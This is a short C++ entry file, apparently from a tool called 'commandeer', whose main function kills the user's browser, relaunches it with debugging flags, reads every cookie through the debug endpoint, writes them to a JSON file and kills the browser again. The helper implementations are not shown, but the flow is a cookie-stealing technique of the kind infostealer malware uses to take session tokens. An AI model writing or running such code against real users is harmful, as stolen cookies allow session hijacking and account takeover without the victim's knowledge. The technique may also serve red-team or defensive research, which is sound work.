// commandeer.cpp
// (C) Martin Alebachew, 2023

#include "commandeer.hpp"

int main()
{    
    OS os;
    Browser browser(os);

    browser.Kill();
    browser.LaunchWithFlags();
    browser.WaitUntilEndpointAccessible();
    std::string dbg_endpoint = browser.ParseDebugEndpoint();
    std::string cookies = browser.GetAllCookies(dbg_endpoint);
    browser.DumpJSONIntoFile(cookies);
    browser.Kill();
}